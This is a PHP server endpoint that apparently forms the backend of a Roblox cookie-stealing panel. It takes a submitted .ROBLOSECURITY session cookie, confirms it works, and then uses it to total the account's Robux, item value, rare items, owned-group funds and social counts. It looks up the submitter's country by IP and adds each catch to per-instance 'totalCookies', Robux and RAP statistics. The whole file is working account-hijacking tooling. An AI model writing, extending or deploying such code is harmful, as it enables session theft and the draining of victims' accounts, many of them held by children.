<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$cookie = $input['cookie'] ?? '';
$instance = $input['instance'] ?? '';

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

$userInfoResult = makeRequest('https://users.roblox.com/v1/users/authenticated', [
    'Cookie: .ROBLOSECURITY=' . $cookie
]);

if ($userInfoResult['code'] !== 200) {
    echo json_encode(['success' => false, 'error' => 'Invalid or expired cookie']);
    exit;
}

$userData = json_decode($userInfoResult['response'], true);
$userId = $userData['id'];
$username = $userData['name'];
$displayName = $userData['displayName'];

$avatarResult = makeRequest("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$userId}&size=420x420&format=Png");
$robuxResult = makeRequest("https://economy.roblox.com/v1/users/{$userId}/currency", [
    'Cookie: .ROBLOSECURITY=' . $cookie
]);
$premiumResult = makeRequest("https://premiumfeatures.roblox.com/v1/users/{$userId}/validate-membership");
$detailsResult = makeRequest("https://users.roblox.com/v1/users/{$userId}");
$collectiblesResult = makeRequest("https://inventory.roblox.com/v1/users/{$userId}/assets/collectibles?limit=100");
$groupsResult = makeRequest("https://groups.roblox.com/v1/users/{$userId}/groups/roles");
$friendsResult = makeRequest("https://friends.roblox.com/v1/users/{$userId}/friends/count");
$followersResult = makeRequest("https://friends.roblox.com/v1/users/{$userId}/followers/count");

$avatar = json_decode($avatarResult['response'], true);
$avatarUrl = $avatar['data'][0]['imageUrl'] ?? '';

$robuxData = json_decode($robuxResult['response'], true);
$robux = $robuxData['robux'] ?? 0;

$isPremium = $premiumResult['code'] === 200;

$details = json_decode($detailsResult['response'], true);
$created = strtotime($details['created']);
$accountAgeDays = floor((time() - $created) / 86400);
$joinDate = date('F j, Y', $created);
$bio = $details['description'] ?? 'No bio';

$collectibles = json_decode($collectiblesResult['response'], true);
$rap = 0;
$hasHeadless = false;
$hasKorblox = false;

if (isset($collectibles['data'])) {
    foreach ($collectibles['data'] as $item) {
        if (isset($item['recentAveragePrice'])) {
            $rap += $item['recentAveragePrice'];
        }
        if ($item['assetId'] == 31117192) $hasHeadless = true;
        if ($item['assetId'] == 139607718) $hasKorblox = true;
    }
}

$groups = json_decode($groupsResult['response'], true);
$ownedGroups = array_filter($groups['data'] ?? [], function($g) {
    return $g['role']['rank'] === 255;
});
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$highestRank = 0;
$highestGroup = 'None';

foreach ($groups['data'] ?? [] as $g) {
    if ($g['role']['rank'] > $highestRank) {
        $highestRank = $g['role']['rank'];
        $highestGroup = $g['group']['name'];
    }
}

foreach (array_slice($ownedGroups, 0, 10) as $group) {
    $fundsResult = makeRequest("https://economy.roblox.com/v1/groups/{$group['group']['id']}/currency", [
        'Cookie: .ROBLOSECURITY=' . $cookie
    ]);
    $funds = json_decode($fundsResult['response'], true);
    $totalGroupFunds += $funds['robux'] ?? 0;
}

$friendsData = json_decode($friendsResult['response'], true);
$followersData = json_decode($followersResult['response'], true);
$friendsCount = $friendsData['count'] ?? 0;
$followersCount = $followersData['count'] ?? 0;

$location = getCountryFromIP();

if (!empty($instance)) {
    $instanceData = getInstanceData($instance);
    if ($instanceData) {
        $instanceData['stats']['totalCookies']++;
        $instanceData['stats']['totalRobux'] += $robux;
        $instanceData['stats']['totalRAP'] += $rap;
        
        updateDailyStats($instance, 'cookies', 1);
        updateDailyStats($instance, 'robux', $robux);
        updateDailyStats($instance, 'rap', $rap);
        
        saveInstanceData($instance, $instanceData);
    }
}
updateGlobalStats('totalCookies');

$response = [
    'success' => true,
    'userInfo' => [
        'userId' => $userId,
        'username' => $username,
        'displayName' => $displayName,
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $isPremium ? '✅ True' : '❌ False',
        'voiceChat' => '❌ Disabled'
    ],
    'avatarUrl' => $avatarUrl,
    'detailedInfo' => [
        'userId' => $userId,
        'username' => $username,
        'displayName' => $displayName,
        'avatarUrl' => $avatarUrl,
        'accountAge' => "{$accountAgeDays} Days",
        'joinDate' => $joinDate,
        'bio' => substr($bio, 0, 100),
        'robux' => $robux,
        'pendingRobux' => 0,
        'creditBalance' => '$0',
        'summary' => "{$robux} R$ | {$rap} RAP",
        'pinStatus' => '❌ Disabled',
        'isPremium' => $isPremium,
        'vcStatus' => '❌ Disabled',
        'emailVerified' => '❌ Not Verified',
        'presenceType' => 'Unknown',
        'location' => $location,
        'games' => [
            'BF' => '❌',
            'AM' => '❌',
            'MM2' => '❌',
            'PS99' => '❌',
            'BB' => '❌'
        ],
        'gamePasses' => [
            'BF' => '❌',
            'AM' => '❌',
            'MM2' => '❌',
            'PS99' => '❌',
            'BB' => '❌'
        ],
        'rap' => $rap,
        'headlessStatus' => $hasHeadless ? '✅ True' : '❌ False',
        'korbloxStatus' => $hasKorblox ? '✅ True' : '❌ False',
        'totalGroupsOwned' => $totalGroupsOwned,
        'highestRank' => $highestRank,
        'highestGroup' => $highestGroup,
        'totalGroupFunds' => $totalGroupFunds,
        'totalPendingGroupFunds' => 0,
        'friendsCount' => $friendsCount,
        'followersCount' => $followersCount
    ]
];

echo json_encode($response);
?>